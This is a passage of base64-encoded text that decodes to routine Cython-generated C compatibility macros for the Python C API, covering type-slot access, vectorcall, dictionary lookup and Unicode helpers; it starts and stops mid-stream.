eDAzMEEwMEIxIHx8IGRlZmluZWQoUHlfSXNOb25lKVxuICAjZGVmaW5lIF9fUHl4X1B5X0lzTm9uZShvYikgUHlfSXNOb25lKG9iKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeV9Jc05vbmUob2IpIF9fUHl4X1B5X0lzKChvYiksIFB5X05vbmUpXG4jZW5kaWZcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMEIxIHx8IGRlZmluZWQoUHlfSXNUcnVlKVxuICAjZGVmaW5lIF9fUHl4X1B5X0lzVHJ1ZShvYikgUHlfSXNUcnVlKG9iKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeV9Jc1RydWUob2IpIF9fUHl4X1B5X0lzKChvYiksIFB5X1RydWUpXG4jZW5kaWZcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMEIxIHx8IGRlZmluZWQoUHlfSXNGYWxzZSlcbiAgI2RlZmluZSBfX1B5eF9QeV9Jc0ZhbHNlKG9iKSBQeV9Jc0ZhbHNlKG9iKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeV9Jc0ZhbHNlKG9iKSBfX1B5eF9QeV9Jcygob2IpLCBQeV9GYWxzZSlcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9Ob25lQXNOdWxsKG9iaikgIChfX1B5eF9QeV9Jc05vbmUob2JqKSA/IE5VTEwgOiAob2JqKSlcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMEYwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgI2RlZmluZSBfX1B5eF9QeU9iamVjdF9HQ19Jc0ZpbmFsaXplZChvKSBQeU9iamVjdF9HQ19Jc0ZpbmFsaXplZChvKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeU9iamVjdF9HQ19Jc0ZpbmFsaXplZChvKSBfUHlHQ19GSU5BTElaRUQobylcbiNlbmRpZlxuI2lmbmRlZiBQeV9UUEZMQUdTX0NIRUNLVFlQRVNcbiAgI2RlZmluZSBQeV9UUEZMQUdTX0NIRUNLVFlQRVMgMFxuI2VuZGlmXG4jaWZuZGVmIFB5X1RQRkxBR1NfSEFWRV9JTkRFWFxuICAjZGVmaW5lIFB5X1RQRkxBR1NfSEFWRV9JTkRFWCAwXG4jZW5kaWZcbiNpZm5kZWYgUHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUlxuICAjZGVmaW5lIFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVIgMFxuI2VuZGlmXG4jaWZuZGVmIFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRVxuICAjZGVmaW5lIFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSAwXG4jZW5kaWZcbiNpZm5kZWYgUHlfVFBGTEFHU19TRVFVRU5DRVxuICAjZGVmaW5lIFB5X1RQRkxBR1NfU0VRVUVOQ0UgMFxuI2VuZGlmXG4jaWZuZGVmIFB5X1RQRkxBR1NfTUFQUElOR1xuICAjZGVmaW5lIFB5X1RQRkxBR1NfTUFQUElORyAwXG4jZW5kaWZcbiNpZm5kZWYgTUVUSF9TVEFDS0xFU1NcbiAgI2RlZmluZSBNRVRIX1NUQUNLTEVTUyAwXG4jZW5kaWZcbiNpZm5kZWYgTUVUSF9GQVNUQ0FMTFxuICAjaWZuZGVmIE1FVEhfRkFTVENBTExcbiAgICAgI2RlZmluZSBNRVRIX0ZBU1RDQUxMIDB4ODBcbiAgI2VuZGlmXG4gIHR5cGVkZWYgUHlPYmplY3QgKigqX19QeXhfUHlDRnVuY3Rpb25GYXN0KSAoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgUHlfc3NpemVfdCBuYXJncyk7XG4gIHR5cGVkZWYgUHlPYmplY3QgKigqX19QeXhfUHlDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzKSAoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICpjb25zdCAqYXJncyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeV9zc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3duYW1lcyk7XG4jZWxzZVxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBNFxuICAjICBkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25GYXN0IFB5Q0Z1bmN0aW9uRmFzdFxuICAjICBkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzIFB5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3Jkc1xuICAjZWxzZVxuICAjICBkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25GYXN0IF9QeUNGdW5jdGlvbkZhc3RcbiAgIyAgZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcyBfUHlDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzXG4gICNlbmRpZlxuI2VuZGlmXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgI2RlZmluZSBfX1B5eF9NRVRIX0ZBU1RDQUxMIE1FVEhfRkFTVENBTExcbiAgI2RlZmluZSBfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbCBfX1B5eF9QeUNGdW5jdGlvbkZhc3RcbiAgI2RlZmluZSBfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcyBfX1B5eF9QeUNGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHNcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfTUVUSF9GQVNUQ0FMTCBNRVRIX1ZBUkFSR1NcbiAgI2RlZmluZSBfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbCBQeUNGdW5jdGlvblxuICAjZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzIFB5Q0Z1bmN0aW9uV2l0aEtleXdvcmRzXG4jZW5kaWZcbiNpZiBDWVRIT05fVkVDVE9SQ0FMTFxuICAjZGVmaW5lIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIHZlY3RvcmNhbGxmdW5jXG4gICNkZWZpbmUgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUICBQWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVRcbiAgI2RlZmluZSBfX1B5eF9QeVZlY3RvcmNhbGxfTkFSR1MobikgIFB5VmVjdG9yY2FsbF9OQVJHUygoc2l6ZV90KShuKSlcbiNlbGlmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMXG4gIHR5cGVkZWYgUHlPYmplY3QgKigqX19weXhfdmVjdG9yY2FsbGZ1bmMpKFB5T2JqZWN0ICpjYWxsYWJsZSwgUHlPYmplY3QgKmNvbnN0ICphcmdzLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcyk7XG4gICNkZWZpbmUgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUICAoKHNpemVfdCkxIDw8ICg4ICogc2l6ZW9mKHNpemVfdCkgLSAxKSlcbiAgI2RlZmluZSBfX1B5eF9QeVZlY3RvcmNhbGxfTkFSR1MobikgICgoUHlfc3NpemVfdCkoKChzaXplX3QpKG4pKSAmIH5fX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQgIDBcbiAgI2RlZmluZSBfX1B5eF9QeVZlY3RvcmNhbGxfTkFSR1MobikgICgoUHlfc3NpemVfdCkobikpXG4jZW5kaWZcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMEIxXG4jZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uX0NoZWNrRXhhY3QoZnVuYykgIFB5Q0Z1bmN0aW9uX0NoZWNrRXhhY3QoZnVuYylcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uX0NoZWNrRXhhY3QoZnVuYykgIFB5Q0Z1bmN0aW9uX0NoZWNrKGZ1bmMpXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0NoZWNrKGZ1bmMpICBQeUNGdW5jdGlvbl9DaGVjayhmdW5jKVxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuI2RlZmluZSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZVTkNUSU9OKGZ1bmMpICAoKChQeUNGdW5jdGlvbk9iamVjdCopKGZ1bmMpKS0+bV9tbC0+bWxfbWV0aClcbiNlbGlmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4jZGVmaW5lIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRlVOQ1RJT04oZnVuYykgIFB5Q0Z1bmN0aW9uX0dFVF9GVU5DVElPTihmdW5jKVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4jZGVmaW5lIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRkxBR1MoZnVuYykgICgoKFB5Q0Z1bmN0aW9uT2JqZWN0KikoZnVuYykpLT5tX21sLT5tbF9mbGFncylcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX1NFTEYoUHlPYmplY3QgKmZ1bmMpIHtcbiAgICByZXR1cm4gKF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRkxBR1MoZnVuYykgJiBNRVRIX1NUQVRJQykgPyBOVUxMIDogKChQeUNGdW5jdGlvbk9iamVjdCopZnVuYyktPm1fc2VsZjtcbn1cbiNlbmRpZlxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X19Jc1NhbWVDRnVuY3Rpb24oUHlPYmplY3QgKmZ1bmMsIHZvaWQgKCpjZnVuYykodm9pZCkpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgcmV0dXJuIFB5Q0Z1bmN0aW9uX0NoZWNrKGZ1bmMpICYmIFB5Q0Z1bmN0aW9uX0dldEZ1bmN0aW9uKGZ1bmMpID09IChQeUNGdW5jdGlvbikgY2Z1bmM7XG4jZWxzZVxuICAgIHJldHVybiBQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSAmJiBQeUNGdW5jdGlvbl9HRVRfRlVOQ1RJT04oZnVuYykgPT0gKFB5Q0Z1bmN0aW9uKSBjZnVuYztcbiNlbmRpZlxufVxuI2RlZmluZSBfX1B5eF9Jc1NhbWVDRnVuY3Rpb24oZnVuYywgY2Z1bmMpICAgX19QeXhfX0lzU2FtZUNGdW5jdGlvbihmdW5jLCBjZnVuYylcbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMFxuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhtLCBzLCBiKSAgKCh2b2lkKW0sIFB5VHlwZV9Gcm9tU3BlY1dpdGhCYXNlcyhzLCBiKSlcbiAgdHlwZWRlZiBQeU9iamVjdCAqKCpfX1B5eF9QeUNNZXRob2QpKFB5T2JqZWN0ICosIFB5VHlwZU9iamVjdCAqLCBQeU9iamVjdCAqY29uc3QgKiwgc2l6ZV90LCBQeU9iamVjdCAqKTtcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX0Zyb21Nb2R1bGVBbmRTcGVjKG0sIHMsIGIpICBQeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMobSwgcywgYilcbiAgI2RlZmluZSBfX1B5eF9QeUNNZXRob2QgIFB5Q01ldGhvZFxuI2VuZGlmXG4jaWZuZGVmIE1FVEhfTUVUSE9EXG4gICNkZWZpbmUgTUVUSF9NRVRIT0QgMHgyMDBcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiAhZGVmaW5lZChQeU9iamVjdF9NYWxsb2MpXG4gICNkZWZpbmUgUHlPYmplY3RfTWFsbG9jKHMpICAgUHlNZW1fTWFsbG9jKHMpXG4gICNkZWZpbmUgUHlPYmplY3RfRnJlZShwKSAgICAgUHlNZW1fRnJlZShwKVxuICAjZGVmaW5lIFB5T2JqZWN0X1JlYWxsb2MocCkgIFB5TWVtX1JlYWxsb2MocClcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgI2RlZmluZSBfX1B5eF9QeUZyYW1lX1NldExpbmVOdW1iZXIoZnJhbWUsIGxpbmVubylcbiNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUxcbiAgI2RlZmluZSBfX1B5eF9QeUNvZGVfSGFzRnJlZVZhcnMoY28pICAoUHlDb2RlX0dldE51bUZyZWUoY28pID4gMClcbiAgI2RlZmluZSBfX1B5eF9QeUZyYW1lX1NldExpbmVOdW1iZXIoZnJhbWUsIGxpbmVubykgX1B5RnJhbWVfU2V0TGluZU51bWJlcigoZnJhbWUpLCAobGluZW5vKSlcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlDb2RlX0hhc0ZyZWVWYXJzKGNvKSAgKFB5Q29kZV9HZXROdW1GcmVlKGNvKSA+IDApXG4gICNkZWZpbmUgX19QeXhfUHlGcmFtZV9TZXRMaW5lTnVtYmVyKGZyYW1lLCBsaW5lbm8pICAoZnJhbWUpLT5mX2xpbmVubyA9IChsaW5lbm8pXG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICNkZWZpbmUgX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50IFB5VGhyZWFkU3RhdGVfR2V0KClcbiNlbGlmICFDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiAgI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQgUHlUaHJlYWRTdGF0ZV9HRVQoKVxuI2VsaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBMVxuICAjZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudCBQeVRocmVhZFN0YXRlX0dldFVuY2hlY2tlZCgpXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudCBfUHlUaHJlYWRTdGF0ZV9VbmNoZWNrZWRHZXQoKVxuI2VuZGlmXG4jaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEVcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgKl9fUHl4X19QeU1vZHVsZV9HZXRTdGF0ZShQeU9iamVjdCAqb3ApXG57XG4gICAgdm9pZCAqcmVzdWx0O1xuICAgIHJlc3VsdCA9IFB5TW9kdWxlX0dldFN0YXRlKG9wKTtcbiAgICBpZiAoIXJlc3VsdClcbiAgICAgICAgUHlfRmF0YWxFcnJvcigiQ291bGRuXCd0IGZpbmQgdGhlIG1vZHVsZSBzdGF0ZSIpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG4jZGVmaW5lIF9fUHl4X1B5TW9kdWxlX0dldFN0YXRlKG8pIChfX3B5eF9tc3RhdGV0eXBlICopX19QeXhfX1B5TW9kdWxlX0dldFN0YXRlKG8pXG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShvcCkgKCh2b2lkKW9wLF9fcHl4X21zdGF0ZV9nbG9iYWwpXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfR2V0U2xvdChvYmosIG5hbWUsIGZ1bmNfY3R5cGUpICBfX1B5eF9QeVR5cGVfR2V0U2xvdChQeV9UWVBFKChQeU9iamVjdCAqKSBvYmopLCBuYW1lLCBmdW5jX2N0eXBlKVxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9UcnlHZXRTbG90KG9iaiwgbmFtZSwgZnVuY19jdHlwZSkgX19QeXhfUHlUeXBlX1RyeUdldFNsb3QoUHlfVFlQRShvYmopLCBuYW1lLCBmdW5jX2N0eXBlKVxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9HZXRTdWJTbG90KG9iaiwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKSBfX1B5eF9QeVR5cGVfR2V0U3ViU2xvdChQeV9UWVBFKG9iaiksIHN1YiwgbmFtZSwgZnVuY19jdHlwZSlcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfVHJ5R2V0U3ViU2xvdChvYmosIHN1YiwgbmFtZSwgZnVuY19jdHlwZSkgX19QeXhfUHlUeXBlX1RyeUdldFN1YlNsb3QoUHlfVFlQRShvYmopLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpXG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX0dldFNsb3QodHlwZSwgbmFtZSwgZnVuY19jdHlwZSkgICgodHlwZSktPm5hbWUpXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX1RyeUdldFNsb3QodHlwZSwgbmFtZSwgZnVuY19jdHlwZSkgX19QeXhfUHlUeXBlX0dldFNsb3QodHlwZSwgbmFtZSwgZnVuY19jdHlwZSlcbiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfR2V0U3ViU2xvdCh0eXBlLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpICgoKHR5cGUpLT5zdWIpID8gKCh0eXBlKS0+c3ViLT5uYW1lKSA6IE5VTEwpXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX1RyeUdldFN1YlNsb3QodHlwZSwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKSBfX1B5eF9QeVR5cGVfR2V0U3ViU2xvdCh0eXBlLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRTbG90KHR5cGUsIG5hbWUsIGZ1bmNfY3R5cGUpICAoKGZ1bmNfY3R5cGUpIFB5VHlwZV9HZXRTbG90KCh0eXBlKSwgUHlfIyNuYW1lKSlcbiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfVHJ5R2V0U2xvdCh0eXBlLCBuYW1lLCBmdW5jX2N0eXBlKVxcXG4gICAgKChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDAgfHxcXFxuICAgICAoUHlUeXBlX0dldEZsYWdzKHR5cGUpICYgUHlfVFBGTEFHU19IRUFQVFlQRSkgfHwgX19QeXhfZ2V0X3J1bnRpbWVfdmVyc2lvbigpID49IDB4MDMwQTAwMDApID9cXFxuICAgICBfX1B5eF9QeVR5cGVfR2V0U2xvdCh0eXBlLCBuYW1lLCBmdW5jX2N0eXBlKSA6IE5VTEwpXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX0dldFN1YlNsb3Qob2JqLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpIF9fUHl4X1B5VHlwZV9HZXRTbG90KG9iaiwgbmFtZSwgZnVuY19jdHlwZSlcbiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfVHJ5R2V0U3ViU2xvdChvYmosIHN1YiwgbmFtZSwgZnVuY19jdHlwZSkgX19QeXhfUHlUeXBlX1RyeUdldFNsb3Qob2JqLCBuYW1lLCBmdW5jX2N0eXBlKVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIHx8IGRlZmluZWQoX1B5RGljdF9OZXdQcmVzaXplZClcbiNkZWZpbmUgX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKG4pICAoKG4gPD0gOCkgPyBQeURpY3RfTmV3KCkgOiBfUHlEaWN0X05ld1ByZXNpemVkKG4pKVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKG4pICBQeURpY3RfTmV3KClcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9QeU51bWJlcl9EaXZpZGUoeCx5KSAgICAgICAgIFB5TnVtYmVyX1RydWVEaXZpZGUoeCx5KVxuI2RlZmluZSBfX1B5eF9QeU51bWJlcl9JblBsYWNlRGl2aWRlKHgseSkgIFB5TnVtYmVyX0luUGxhY2VUcnVlRGl2aWRlKHgseSlcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMU1xuI2RlZmluZSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cldpdGhFcnJvcihkaWN0LCBuYW1lKSAgX1B5RGljdF9HZXRJdGVtX0tub3duSGFzaChkaWN0LCBuYW1lLCAoKFB5QVNDSUlPYmplY3QgKikgbmFtZSktPmhhc2gpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyKFB5T2JqZWN0ICpkaWN0LCBQeU9iamVjdCAqbmFtZSkge1xuICAgIFB5T2JqZWN0ICpyZXMgPSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cldpdGhFcnJvcihkaWN0LCBuYW1lKTtcbiAgICBpZiAocmVzID09IE5VTEwpIFB5RXJyX0NsZWFyKCk7XG4gICAgcmV0dXJuIHJlcztcbn1cbiNlbGlmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgUFlQWV9WRVJTSU9OX05VTSA+PSAweDA3MDIwMDAwXG4jZGVmaW5lIF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyV2l0aEVycm9yICBQeURpY3RfR2V0SXRlbVdpdGhFcnJvclxuI2RlZmluZSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0ciAgICAgICAgICAgUHlEaWN0X0dldEl0ZW1cbiNlbHNlXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyV2l0aEVycm9yKFB5T2JqZWN0ICpkaWN0LCBQeU9iamVjdCAqbmFtZSkge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuICAgIHJldHVybiBQeURpY3RfR2V0SXRlbShkaWN0LCBuYW1lKTtcbiNlbHNlXG4gICAgUHlEaWN0RW50cnkgKmVwO1xuICAgIFB5RGljdE9iamVjdCAqbXAgPSAoUHlEaWN0T2JqZWN0KikgZGljdDtcbiAgICBsb25nIGhhc2ggPSAoKFB5U3RyaW5nT2JqZWN0ICopIG5hbWUpLT5vYl9zaGFzaDtcbiAgICBhc3NlcnQoaGFzaCAhPSAtMSk7XG4gICAgZXAgPSAobXAtPm1hX2xvb2t1cCkobXAsIG5hbWUsIGhhc2gpO1xuICAgIGlmIChlcCA9PSBOVUxMKSB7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICByZXR1cm4gZXAtPm1lX3ZhbHVlO1xuI2VuZGlmXG59XG4jZGVmaW5lIF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyICAgICAgICAgICBQeURpY3RfR2V0SXRlbVxuI2VuZGlmXG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX0dldEZsYWdzKHRwKSAgICgoKFB5VHlwZU9iamVjdCAqKXRwKS0+dHBfZmxhZ3MpXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX0hhc0ZlYXR1cmUodHlwZSwgZmVhdHVyZSkgICgoX19QeXhfUHlUeXBlX0dldEZsYWdzKHR5cGUpICYgKGZlYXR1cmUpKSAhPSAwKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfR2V0RmxhZ3ModHApICAgKFB5VHlwZV9HZXRGbGFncygoUHlUeXBlT2JqZWN0ICopdHApKVxuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKHR5cGUsIGZlYXR1cmUpICBQeVR5cGVfSGFzRmVhdHVyZSh0eXBlLCBmZWF0dXJlKVxuI2VuZGlmXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhpdGVyYXRvcikgIF9fUHl4X1B5T2JqZWN0X0dldFNsb3QoaXRlcmF0b3IsIHRwX2l0ZXJuZXh0LCBpdGVybmV4dGZ1bmMpXG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwMDBcbiNkZWZpbmUgX19QeXhfUHlIZWFwVHlwZU9iamVjdF9HQ19EZWwob2JqKSAge1xcXG4gICAgUHlUeXBlT2JqZWN0ICp0eXBlID0gUHlfVFlQRSgoUHlPYmplY3QqKW9iaik7XFxcbiAgICBhc3NlcnQoX19QeXhfUHlUeXBlX0hhc0ZlYXR1cmUodHlwZSwgUHlfVFBGTEFHU19IRUFQVFlQRSkpO1xcXG4gICAgUHlPYmplY3RfR0NfRGVsKG9iaik7XFxcbiAgICBQeV9ERUNSRUYodHlwZSk7XFxcbn1cbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5SGVhcFR5cGVPYmplY3RfR0NfRGVsKG9iaikgIFB5T2JqZWN0X0dDX0RlbChvYmopXG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX1JFQURZKG9wKSAgICAgICAoMClcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfUkVBRF9DSEFSKHUsIGkpIFB5VW5pY29kZV9SZWFkQ2hhcih1LCBpKVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRSh1KSAgICgodm9pZCl1LCAxMTE0MTExVSlcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfS0lORCh1KSAgICAgICAgICgodm9pZCl1LCAoMCkpXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0RBVEEodSkgICAgICAgICAoKHZvaWQqKXUpXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX1JFQUQoaywgZCwgaSkgICAoKHZvaWQpaywgUHlVbmljb2RlX1JlYWRDaGFyKChQeU9iamVjdCopKGQpLCBpKSlcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfSVNfVFJVRSh1KSAgICAgICgwICE9IFB5VW5pY29kZV9HZXRMZW5ndGgodSkpXG4jZWxzZVxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMFxuICAgICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX1JFQURZKG9wKSAgICAgICAoMClcbiAgI2Vsc2VcbiAgICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9SRUFEWShvcCkgICAgICAgKGxpa2VseShQeVVuaWNvZGVfSVNfUkVBRFkob3ApKSA/XFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDAgOiBfUHlVbmljb2RlX1JlYWR5KChQeU9iamVjdCAqKShvcCkpKVxuICAjZW5kaWZcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfUkVBRF9DSEFSKHUsIGkpIFB5VW5pY29kZV9SRUFEX0NIQVIodSwgaSlcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUodSkgICBQeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUodSlcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfS0lORCh1KSAgICAgICAgICgoaW50KVB5VW5pY29kZV9LSU5EKHUpKVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9EQVRBKHUpICAgICAgICAgUHlVbmljb2RlX0RBVEEodSlcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfUkVBRChrLCBkLCBpKSAgIFB5VW5pY29kZV9SRUFEKGssIGQsIGkpXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX1dSSVRFKGssIGQsIGksIGNoKSAgUHlVbmljb2RlX1dSSVRFKGssIGQsIGksIChQeV9VQ1M0KSBjaClcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDBcbiAgICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9JU19UUlVFKHUpICAgICAgKDAgIT0gUHlVbmljb2RlX0dFVF9MRU5HVEgodSkpXG4gICNlbHNlXG4gICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwXG4gICAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfSVNfVFJVRSh1KSAgICAgICgwICE9IChsaWtlbHkoUHlVbmljb2RlX0lTX1JFQURZKHUpKSA/IFB5VW5pY29kZV9HRVRfTEVOR1RIKHUpIDogKChQeUNvbXBhY3RVbmljb2RlT2JqZWN0ICopKHUpKS0+d3N0cl9sZW5ndGg